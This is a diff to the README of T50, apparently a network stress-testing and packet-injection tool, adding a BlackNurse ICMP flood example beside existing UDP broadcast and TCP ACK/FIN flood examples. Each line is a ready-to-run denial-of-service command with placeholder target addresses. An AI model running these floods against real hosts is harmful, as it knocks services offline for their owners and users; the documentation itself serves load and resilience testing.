@@ -122,6 +122,8 @@ The main differentiator of the **T50** is that it is able to send all protocols,
 * ```$ sudo ./t50 [broadcast-address] --saddr [target-address] --sport [target-port] --protocol UDP --flood```
 5. [CVE-2002-1712](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1712):
 * ```$ sudo ./t50 [target-address]  --dport [target-port] --protocol TCP --ack --fin --window 16384 --flood```
+6. [BlackNurse](http://blacknurse.dk):
+* ```$ sudo ./t50 [target-address] --protocol ICMP --icmp-type 3 --icmp-code 3 --flood```
 
 For current release of **T50**, please, refer to this [link](https://github.com/fredericopissarra/t50).
 
